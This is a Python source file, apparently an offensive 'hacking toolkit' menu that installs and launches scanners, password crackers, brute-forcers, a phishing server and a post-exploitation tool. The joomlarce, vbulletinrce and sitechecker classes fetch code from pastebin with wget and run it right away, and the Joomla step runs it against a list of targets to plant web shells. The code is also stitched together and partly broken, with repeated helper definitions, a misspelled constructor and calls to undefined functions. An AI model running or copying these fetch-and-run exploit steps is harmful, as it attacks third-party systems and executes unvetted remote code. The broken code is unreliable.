    def authenticate(self):
        """Authenticate with Nessus API to obtain session token."""
        print("Authenticating with Nessus...")
        headers = {"Content-Type": "application/json"}
        data = {
            "username": self.username,
            "password": self.password
        }
        response = requests.post(self.nessusUrl + "/session", headers=headers, data=json.dumps(data))
        if response.status_code == 200:
            self.access_token = response.json()["token"]
            print("Authentication successful!")
        else:
            print("Authentication failed: ", response.text)

    def run(self):
        """Run the Nessus tool."""
        clearScr()
        print(self.nessusLogo)
        print("   Nessus is ready to use.")
        print("   {1}--Start New Scan")
        print("   {2}--Monitor Ongoing Scan")
        print("   {3}--Fetch Scan Results\n")
        print("   {99}-Return to information gathering menu\n")
        response = raw_input("nessus ~# ")
        clearScr()

        if response == "1":
            self.start_scan()
        elif response == "2":
            self.monitor_scan()
        elif response == "3":
            self.fetch_results()
        elif response == "99":
            pass
        else:
            self.run()

    def start_scan(self):
        """Start a new Nessus scan."""
        print("Starting a new Nessus scan...")
        scan_name = raw_input("   Enter scan name: ")
        target = raw_input("   Enter target IP/Range/Hostname: ")

        headers = {"X-Cookie": "token=" + self.access_token, "Content-Type": "application/json"}
        scan_data = {
            "uuid": self.get_policy_uuid(),  # Assuming a default scan policy exists
            "settings": {
                "name": scan_name,
                "enabled": True,
                "text_targets": target
            }
        }
        response = requests.post(self.nessusUrl + "/scans", headers=headers, data=json.dumps(scan_data))
        if response.status_code == 200:
            print("Scan started successfully.")
        else:
            print("Error starting scan: ", response.text)

    def monitor_scan(self):
        """Monitor an ongoing scan."""
        scan_id = raw_input("   Enter scan ID to monitor: ")
        headers = {"X-Cookie": "token=" + self.access_token}

        while True:
            response = requests.get(self.nessusUrl + "/scans/" + scan_id, headers=headers)
            if response.status_code == 200:
                scan_data = response.json()
                scan_status = scan_data["info"]["status"]
                progress = scan_data["info"]["progress"]

                print("   Scan Status: %s, Progress: %s%%" % (scan_status, progress))
                if scan_status == "completed":
                    print("   Scan completed!")
                    break
                time.sleep(10)
            else:
                print("Error fetching scan status: ", response.text)
                break

    def fetch_results(self):
        """Fetch the results of a completed scan."""
        scan_id = raw_input("   Enter scan ID to fetch results: ")
        headers = {"X-Cookie": "token=" + self.access_token}
        
        response = requests.get(self.nessusUrl + "/scans/" + scan_id, headers=headers)
        if response.status_code == 200:
            scan_data = response.json()
            print("   Scan Name: %s" % scan_data["info"]["name"])
            print("   Vulnerabilities found: ")

            for vuln in scan_data["vulnerabilities"]:
                print("   - %s (Severity: %s, Count: %s)" % (
                    vuln["plugin_name"],
                    vuln["severity"],
                    vuln["count"]
                ))
        else:
            print("Error fetching scan results: ", response.text)

    def get_policy_uuid(self):
        """Fetch the UUID of a default scan policy (basic scan)."""
        headers = {"X-Cookie": "token=" + self.access_token}
        response = requests.get(self.nessusUrl + "/editor/policies", headers=headers)
        if response.status_code == 200:
            policies = response.json()["policies"]
            for policy in policies:
                if policy["name"] == "Basic Network Scan":  # Assuming basic policy exists
                    return policy["uuid"]
        else:
            print("Error fetching policies: ", response.text)
        return None



class shelltarget:
    
    def shelltarget():
        print("Exemple: http://target.com")
        line = raw_input("target: ")
        line = line.rstrip()
        grabuploadedlink(line)
        grabshell(line)


class joomlarce:

    def joomlarce():
        os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
        clearScr()
        print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
        jmtarget = raw_input("Select a targets list:")
        os.system("python temp.py %s" % jmtarget)


class vbulletinrce:

    def vbulletinrce():
        os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
        os.system("perl tmp.pl")





class ArachniTool:
    arachni_logo = """
     ___                        _     _ 
    / _ \                      (_)   | |
   / /_\ \ _ __   __ _  _ __    _  __| |
   |  _  || '__| / _` || '_ \  | |/ _` |
   | | | || |   | (_| || | | | | | (_| |
   \_| |_/|_|    \__,_||_| |_| |_|\__,_|
"""
    def __init__(self):
        self.installDir = toolDir + "arachni"
        self.downloadUrl = "https://github.com/Arachni/arachni/releases/latest/download/arachni-x.x.x-x86_64-linux.tar.gz"
        self.extractedDir = self.installDir + "/arachni-x.x.x"

        self.targetPrompt = "   Enter Target URL for Vulnerability Scan: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.extractedDir + "/bin/arachni")

    def install(self):
        # Download and extract Arachni
        os.system("mkdir -p %s" % self.installDir)
        os.system("wget %s -O %s/arachni.tar.gz" % (self.downloadUrl, self.installDir))
        os.system("cd %s && tar -zxvf arachni.tar.gz" % self.installDir)

    def run(self):
        clearScr()
        print(self.arachni_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.arachni_logo)
        print("   Arachni Scan for: %s\n" % target)
        print("   {1}--Basic Scan")
        print("   {2}--Full Audit Scan")
        print("   {3}--Scan with Plugin")
        print("   {99}-Return to previous menu \n")
        response = raw_input("arachni ~# ")
        clearScr()
        logPath = "logs/arachni-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".afr"
        try:
            if response == "1":
                os.system("%s/bin/arachni %s --report-save-path=%s" % (self.extractedDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("%s/bin/arachni %s --checks=all --report-save-path=%s" % (self.extractedDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                plugin = raw_input("Enter the plugin name (e.g., xss, csrf): ")
                os.system("%s/bin/arachni %s --plugin=%s --report-save-path=%s" % (self.extractedDir, target, plugin, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."


class postExploitationMenu:
    menuLogo = '''
    

______            _            _____              _         _  _   
| ___ \          | |          |  ___|            | |       (_)| |  
| |_/ /___   ___ | |_  ______ | |__ __  __ _ __  | |  ___   _ | |_ 
|  __// _ \ / __|| __||______||  __|\ \/ /| '_ \ | | / _ \ | || __|
| |  | (_) |\__ \| |_         | |___ >  < | |_) || || (_) || || |_ 
\_|   \___/ |___/ \__|        \____//_/\_\| .__/ |_| \___/ |_| \__|
                                          | |                      
                                          |_|                      

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Shell Checker")
        print("   {2}--POET")
        print("   {3}--Phishing Framework \n")
        print("   {99}-Return to main menu \n ")
        choice11 = raw_input(sayahacPrompt)
        clearScr()
        if choice11 == "1":
            sitechecker()
        elif choice11 == "2":
            poet()
        elif choice11 == "3":
            weeman()
        elif choice11 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()




class sitechecker:

    def sitechecker():
        os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
        clearScr()
        os.system("python ch01.py")


class poet:

    def poet():
        print("POET is a simple POst-Exploitation Tool.\n")
        if yesOrNo():
            os.system("git clone --depth=1 https://github.com/mossberg/poet.git")
            os.system("python poet/server.py")
        else:
            postExploitationMenu.completed("POET")


class weeman:

    def weeman():
        print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
        if yesOrNo():
            os.system(
                "git clone --depth=1 https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
        else:
            sayahac()



'''
Information Gathering Tools Classes
'''


class informationGatheringMenu:
    menuLogo = '''
    

{__{___     {__{________  {____              {____       {_       
{__{_ {__   {__{__      {__    {__         {_    {__    {_ __     
{__{__ {__  {__{__    {__        {__      {__          {_  {__    
{__{__  {__ {__{______{__        {__{_____{__         {__   {__   
{__{__   {_ {__{__    {__        {__      {__   {____{______ {__  
{__{__    {_ __{__      {__     {__        {__    {_{__       {__ 
{__{__      {__{__        {____             {_____ {__         {__
                                                                  
                                                                       

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)

        print("  {1}--Nmap - Network Mapper")
        print("  {2}--Recon-ng")
        print("  {3}--Host To IP")
        print("  {4}--WPScan")
        print("  {5}--CMSmap")
        print("  {6}--XSStrike")
        print("  {7}--Google_Dorks")
        print("  {8}--Crips\n  ")
        print("  {99}-Back To Main Menu \n")
        choice2 = raw_input(sayahacPrompt)
        clearScr()
        if choice2 == "1":
            nmap()
        elif choice2 == "2":
            ReconNGTool()
        elif choice2 == "3":
            host2ip()
        elif choice2 == "4":
            wpscan()
        elif choice2 == "5":
            CMSmap()
        elif choice2 == "6":
            XSStrike()
        elif choice2 == "7":
            GoogleDorkTool()
        elif choice2 == "8":
            crips()
        elif choice2 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class nmap:
    nmapLogo = '''
    

                                                   
    _/      _/                                     
   _/_/    _/  _/_/_/  _/_/      _/_/_/  _/_/_/    
  _/  _/  _/  _/    _/    _/  _/    _/  _/    _/   
 _/    _/_/  _/    _/    _/  _/    _/  _/    _/    
_/      _/  _/    _/    _/    _/_/_/  _/_/_/       
                                     _/            
                                    _/             
 
                                                                                     

    '''

    def __init__(self):
        self.installDir = toolDir + "nmap"
        self.gitRepo = "https://github.com/nmap/nmap.git"

        self.targetPrompt = "   Enter Target IP/Subnet/Range/Host: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/nmap") or os.path.isfile("/usr/local/bin/nmap"))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("cd %s && ./configure && make && make install" %
                  self.installDir)

    def run(self):
        clearScr()
        print(self.nmapLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.nmapLogo)
        print("   Nmap scan for: %s\n" % target)
        print("   {1}--Simple Scan [-sV]")
        print("   {2}--Firewall Scan [-Pn]")
        print("   {3}--Aggressive Scan [-A]\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("nmap ~# ")
        clearScr()
        logPath = "logs/nmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("nmap -sV -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("nmap -Pn -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("nmap -A -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)



class ReconNGTool:
    recon_logo = """
  ______               _   _      _   _   
 |  ____|             (_) | |    (_) | |  
 | |__     ___   ___   _  | | __  _  | |_ 
 |  __|   / _ \ / _ \ | | | |/ / | | | __|
 | |     |  __/| (_) || | |   <  | | | |_ 
 |_|      \___| \___/ |_| |_|\_\ |_|  \__|
"""
    def __init__(self):
        self.installDir = toolDir + "recon-ng"
        self.gitRepo = "https://github.com/lanmaster53/recon-ng.git"
        
        self.targetPrompt = "   Enter the domain or IP to gather intelligence on: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/recon-ng") or os.path.isfile("/usr/local/bin/recon-ng"))


    def install(self):
        # Clone the Recon-ng repository
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && pip install -r REQUIREMENTS" % self.installDir)

    def run(self):
        clearScr()
        print(self.recon_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.recon_logo)
        print("   Recon-ng Intelligence Gathering for: %s\n" % target)
        print("   {1}--Basic Domain Info Gathering")
        print("   {2}--Whois Lookup")
        print("   {3}--DNS Enumeration")
        print("   {4}--IP Geolocation")
        print("   {5}--Gather Contacts (Email, Name)")
        print("   {99}-Return to previous menu \n")
        response = raw_input("recon-ng ~# ")
        clearScr()
        logPath = "logs/recon-ng-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("%s/recon-ng -m recon/domains-hosts/shodan_hostname -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("%s/recon-ng -m recon/domains-hosts/whois_pocs -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("%s/recon-ng -m recon/domains-hosts/brute_hosts -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("%s/recon-ng -m recon/hosts-hosts/ip_geolocation -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "5":
                os.system("%s/recon-ng -m recon/contacts-contacts/email_contacts -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class host2ip:
    host2ipLogo = '''
   
    
  _   _     U  ___ u  ____     _____    ____               ____    
 |'| |'|     \/"_ \/ / __"| u |_ " _|  |___"\     ___    U|  _"\ u 
/| |_| |\    | | | |<\___ \/    | |    U __) |   |_"_|   \| |_) |/ 
U|  _  |u.-,_| |_| | u___) |   /| |\   \/ __/ \   | |     |  __/   
 |_| |_|  \_)-\___/  |____/>> u |_|U   |_____|u U/| |\u   |_|      
 //   \\       \\     )(  (__)_// \\_  <<  //.-,_|___|_,-.||>>_    
(_") ("_)     (__)   (__)    (__) (__)(__)(__)\_)-' '-(_/(__)__)   
                                                                                                                                  

    '''

    def __init__(self):
        clearScr()
        print(self.host2ipLogo)
        host = raw_input("   Enter a Host: ")
        ip = socket.gethostbyname(host)
        print("   %s has the IP of %s" % (host, ip))
        response = raw_input(continuePrompt)


class wpscan:
    wpscanLogo = '''
    
    
               ____     ____      ____     _      _   _     
 __        __U|  _"\ u / __"| uU /"___|U  /"\  u | \ |"|    
 \"\      /"/\| |_) |/<\___ \/ \| | u   \/ _ \/ <|  \| |>   
 /\ \ /\ / /\ |  __/   u___) |  | |/__  / ___ \ U| |\  |u   
U  \ V  V /  U|_|      |____/>>  \____|/_/   \_\ |_| \_|    
.-,_\ /\ /_,-.||>>_     )(  (__)_// \\  \\    >> ||   \\,-. 
 \_)-'  '-(_/(__)__)   (__)    (__)(__)(__)  (__)(_")  (_/  
                                                                                                                                                                

    '''

    def __init__(self):
        self.installDir = toolDir + "wpscan"
        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.wpscanLogo)
        target = raw_input("   Enter a Target: ")
        self.menu(target)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def menu(self, target):
        clearScr()
        print(self.wpscanLogo)
        print("   WPScan for: %s\n" % target)
        print("   {1}--Username Enumeration [--enumerate u]")
        print("   {2}--Plugin Enumeration [--enumerate p]")
        print("   {3}--All Enumeration Tools [--enumerate]\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("wpscan ~# ")
        clearScr()
        logPath = "../../logs/wpscan-" + \
            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        wpscanOptions = "--no-banner --random-agent --url %s" % target
        try:
            if response == "1":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate u --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate p --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system(
                    "ruby tools/wpscan/wpscan.rb %s --enumerate --log %s" % (wpscanOptions, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)


class CMSmap:
    CMSmapLogo = '''
     
                                                                
                                                                
  .--.   ___ .-. .-.      .--.   ___ .-. .-.     .---.   .-..   
 /    \ (   )   '   \   /  _  \ (   )   '   \   / .-, \ /    \  
|  .-. ; |  .-.  .-. ; . .' `. ; |  .-.  .-. ; (__) ; |' .-,  ; 
|  |(___)| |  | |  | | | '   | | | |  | |  | |   .'`  || |  . | 
|  |     | |  | |  | | _\_`.(___)| |  | |  | |  / .'| || |  | | 
|  | ___ | |  | |  | |(   ). '.  | |  | |  | | | /  | || |  | | 
|  '(   )| |  | |  | | | |  `\ | | |  | |  | | ; |  ; || |  ' | 
'  `-' | | |  | |  | | ; '._,' ' | |  | |  | | ' `-'  || `-'  ' 
 `.__,' (___)(___)(___) '.___.' (___)(___)(___)`.__.'_.| \__.'  
                                                       | |      
                                                      (___)     

    '''

    def __init__(self):
        self.installDir = toolDir + "CMSmap"
        self.gitRepo = "https://github.com/Dionach/CMSmap.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.CMSmapLogo)
        target = raw_input("   Enter a Target: ")
        self.run(target)
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def run(self, target):
        logPath = "logs/cmsmap-" + \
            strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        try:
            os.system("python %s/cmsmap.py -t %s -o %s" %
                      (self.installDir, target, logPath))
        except:
            pass


class XSStrike:
    XSStrikeLogo = '''
    
                              ___                    ___                
                             (   )              .-. (   )               
 ___  ___    .--.      .--.   | |_    ___ .-.  ( __) | |   ___   .--.   
(   )(   ) /  _  \   /  _  \ (   __) (   )   \ (''") | |  (   ) /    \  
 | |  | | . .' `. ; . .' `. ; | |     | ' .-. ; | |  | |  ' /  |  .-. ; 
  \ `' /  | '   | | | '   | | | | ___ |  / (___)| |  | |,' /   |  | | | 
  / ,. \  _\_`.(___)_\_`.(___)| |(   )| |       | |  | .  '.   |  |/  | 
 ' .  ; .(   ). '. (   ). '.  | | | | | |       | |  | | `. \  |  ' _.' 
 | |  | | | |  `\ | | |  `\ | | ' | | | |       | |  | |   \ \ |  .'.-. 
 | |  | | ; '._,' ' ; '._,' ' ' `-' ; | |       | |  | |    \ .'  `-' / 
(___)(___) '.___.'   '.___.'   `.__. (___)     (___)(___ ) (___)`.__.'  
                                                                        
                                                                        

    '''

    def __init__(self):
        self.installDir = toolDir + "XSStrike"
        self.gitRepo = "https://github.com/UltimateHackers/XSStrike.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.XSStrikeLogo)
        self.run()
        response = raw_input(continuePrompt)

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("pip install -r %s/requirements.txt" % self.installDir)

    def run(self):
        os.system("python %s/xsstrike" % self.installDir)




class GoogleDorkTool:
    google_dork_logo = '''
  _____            _       _     
 / ____|          (_)     | |    
| |  __  ___  ___  _ _ __ | |__  
| | |_ |/ _ \/ _ \| | '_ \| '_ \ 
| |__| |  __/ (_) | | | | | | | |
 \_____|\___|\___/|_|_| |_|_| |_|
    '''

    def __init__(self):
        self.targetPrompt = "   Enter Target Domain (e.g., example.com): "

        self.run()

    def run(self):
        clearScr()
        print(self.google_dork_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.google_dork_logo)
        print("   Google Dorking for domain: %s\n" % target)
        print("   {1}--Search for Indexes (intitle:index.of)")
        print("   {2}--Search for Config Files (ext:xml | ext:conf)")
        print("   {3}--Search for Login Pages (inurl:admin)")
        print("   {4}--Search for SQL Errors (intext:\"sql syntax\")")
        print("   {99}-Return to previous menu \n")
        response = raw_input("google-dork ~# ")
        clearScr()
        logPath = "logs/google-dork-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                query = "intitle:index.of site:%s" % target
                self.google_search(query, logPath)
            elif response == "2":
                query = "ext:xml OR ext:conf site:%s" % target
                self.google_search(query, logPath)
            elif response == "3":
                query = "inurl:admin site:%s" % target
                self.google_search(query, logPath)
            elif response == "4":
                query = "intext:\"sql syntax\" site:%s" % target
                self.google_search(query, logPath)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

    def google_search(self, query, logPath):
        url = "https://www.google.com/search?q=" + query.replace(' ', '+')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
        
        try:
            response = requests.get(url, headers=headers)
            response.raise_for_status()  # Check if request was successful

            soup = BeautifulSoup(response.text, "html.parser")
            search_results = soup.find_all('a')

            if not search_results:
                print("No results found or Google blocked the request.")
                return

            with open(logPath, 'w') as log_file:
                print("\n--- Google Dork Results ---\n")
                log_file.write("--- Google Dork Results ---\n")
                for link in search_results:
                    href = link.get('href')
                    if 'url?q=' in href and not 'webcache' in href:
                        actual_link = href.split('url?q=')[1].split('&sa=U')[0]
                        print(actual_link)
                        log_file.write(actual_link + '\n')
                print("\n--- End of Results ---\n")
                log_file.write("\n--- End of Results ---\n")
        except requests.exceptions.RequestException as e:
            print("An error occurred: %s" % e)

        raw_input("Press Enter to continue...")

# Helper function
def clearScr():
    os.system('cls' if os.name == 'nt' else 'clear')





class crips:
    cripsLogo = '''
     
 _______  _______ _________ _______  _______ 
(  ____ \(  ____ )\__   __/(  ____ )(  ____ \
| (    \/| (    )|   ) (   | (    )|| (    \/
| |      | (____)|   | |   | (____)|| (_____ 
| |      |     __)   | |   |  _____)(_____  )
| |      | (\ (      | |   | (            ) |
| (____/\| ) \ \_____) (___| )      /\____) |
(_______/|/   \__/\_______/|/       \_______)
                                             

    '''

    def __init(self):
        self.installDir = toolDir + "Crips"
        self.gitRepo = "https://github.com/Manisso/Crips.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.cripsLogo)
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir) or os.path.isdir("/usr/share/doc/Crips"))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("bash %s/install.sh" % self.installDir)

    def run(self):
        try:
            os.system("crips")
        except:
            pass


'''
Password Attack Tools Classes
'''


class passwordAttacksMenu:
    menuLogo = '''
    
  ____       _      ____    ____                   ____    
U|  _"\ uU  /"\  u / __"| u/ __"| u  __        __ |  _"\   
\| |_) |/ \/ _ \/ <\___ \/<\___ \/   \"\      /"//| | | |  
 |  __/   / ___ \  u___) | u___) |   /\ \ /\ / /\U| |_| |\ 
 |_|     /_/   \_\ |____/>>|____/>> U  \ V  V /  U|____/ u 
 ||>>_    \\    >>  )(  (__))(  (__).-,_\ /\ /_,-. |||_    
(__)__)  (__)  (__)(__)    (__)      \_)-'  '-(_/ (__)_)                                                                                              

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Cupp - Common User Passwords Profiler")
        print("  {2}--John the ripper")
        print(
            "   {3}--BruteX - Automatically bruteforces all services running on a target\n")
        print("   {99}-Back To Main Menu \n")
        choice3 = raw_input("passwd ~# ")
        clearScr()
        if choice3 == "1":
            cupp()
        elif choice3 == "2":
            JohnTheRipperTool()
        elif choice3 == "3":
            brutex()
        elif choice3 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class cupp:
    cuppLogo = '''
    
       _..._                                                            
    .-'_..._''.                                                         
  .' .'      '.\          _________   _...._    _________   _...._      
 / .'                     \        |.'      '-. \        |.'      '-.   
. '                        \        .'```'.    '.\        .'```'.    '. 
| |                         \      |       \     \\      |       \     \
| |               _    _     |     |        |    | |     |        |    |
. '              | '  / |    |      \      /    .  |      \      /    . 
 \ '.          ..' | .' |    |     |\`'-.-'   .'   |     |\`'-.-'   .'  
  '. `._____.-'//  | /  |    |     | '-....-'`     |     | '-....-'`    
    `-.______ /|   `'.  |   .'     '.             .'     '.             
             ` '   .'|  '/'-----------'         '-----------'           
                `-'  `--'                                               

     '''

    def __init__(self):
        self.installDir = toolDir + "cupp"
        self.gitRepo = "https://github.com/Mebus/cupp.git"

        if not self.installed():
            self.install()
        clearScr()
        print(self.cuppLogo)
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))

    def run(self):
        os.system("python %s/cupp.py -i" % self.installDir)


class JohnTheRipperTool:
    john_logo = """
     _       _     _   _                
    | |     (_)   | | (_)               
    | | ___  _  __| |  _ ___  ___  _ __ 
    | |/ _ \| |/ _` | | / __|/ _ \| '__|
    | | (_) | | (_| |_| \__ \ (_) | |   
    |_|\___/|_|\__,_(_) |___/\___/|_|   
"""
    def __init__(self):
        self.installDir = toolDir + "john"
        self.gitRepo = "https://github.com/openwall/john.git"
        
        self.targetPrompt = "   Enter the path to the password hash file: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/run/john")

    def install(self):
        # Clone the John the Ripper repository and build it
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s/src && ./configure && make" % self.installDir)

    def run(self):
        clearScr()
        print(self.john_logo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.john_logo)
        print("   John the Ripper Attack for Target: %s\n" % target)
        print("   {1}--Basic Crack")
        print("   {2}--Dictionary Attack")
        print("   {3}--Incremental Brute-force Attack")
        print("   {4}--Show Cracked Passwords")
        print("   {99}-Return to previous menu \n")
        response = raw_input("john ~# ")
        clearScr()
        logPath = "logs/john-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("%s/run/john %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                wordlist = raw_input("Enter the path to the wordlist file (e.g., /usr/share/wordlists/rockyou.txt): ")
                os.system("%s/run/john --wordlist=%s %s" % (self.installDir, wordlist, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("%s/run/john --incremental %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("%s/run/john --show %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."

class brutex:
    def __init__(self):
        self.installDir = toolDir + "brutex"
        self.gitRepo = "https://github.com/1N3/BruteX.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        if not os.path.isdir("/usr/share/brutex"):
            os.makedirs("/usr/share/brutex")
        os.system("cd %s && chmod +x install.sh && ./install.sh" % self.installDir)

    def run(self):
        target = raw_input("Enter Target IP: ")
        os.system("brutex %s" % target)

        

class wirelessTestingMenu:
    menuLogo = '''
   
 __          __ _____  _____   ______  _       ______   _____  _____ 
 \ \        / /|_   _||  __ \ |  ____|| |     |  ____| / ____|/ ____|
  \ \  /\  / /   | |  | |__) || |__   | |     | |__   | (___ | (___  
   \ \/  \/ /    | |  |  _  / |  __|  | |     |  __|   \___ \ \___ \ 
    \  /\  /    _| |_ | | \ \ | |____ | |____ | |____  ____) |____) |
     \/  \/    |_____||_|  \_\|______||______||______||_____/|_____/ 
                                                                     
                                                                     

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--reaver ")
        print("   {2}--KismetTool")
        print("    {3}--Aircrack-ng")
        print("   {4}--Bluetooth Honeypot GUI Framework \n")
        print("   {99}-Back To The Main Menu \n")
        choice4 = raw_input(sayahacPrompt) 
        clearScr()
        if choice4 == "1":
            reaver()
        elif choice4 == "2":
            KismetTool()
        elif choice4 == "3":
            AircrackNGTool()
        elif choice4 == "4":
            bluepot()
        elif choice4 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class reaver:
    def __init__(self):
        self.installDir = toolDir + "reaver"
        self.gitRepo = "https://github.com/t6x/reaver-wps-fork-t6x.git"

        if not self.installed():
            self.install()
        clearScr()
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system(
            "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("cd %s/" % self.installDir)
        os.system("./configure")
        os.system("make")
        os.system("sudo make install")

    def run(self):
        os.system("reaver --help")


class KismetTool:
    kismet_logo = """
  _  __ _     _   
 | |/ /(_)   | |  
 | ' /  _  __| |_ 
 |  <  | |/ _` __|
 | . \ | | (_| |_ 
 |_|\_\|_|\__,_(_)
"""
    def __init__(self):
        self.installDir = toolDir + "kismet"
        self.gitRepo = "https://github.com/kismetwireless/kismet.git"
        
        self.targetPrompt = "   Enter Wireless Interface (e.g., wlan0): "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile("/usr/local/bin/kismet")

    def install(self):
        # Clone the Kismet repository and install it
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
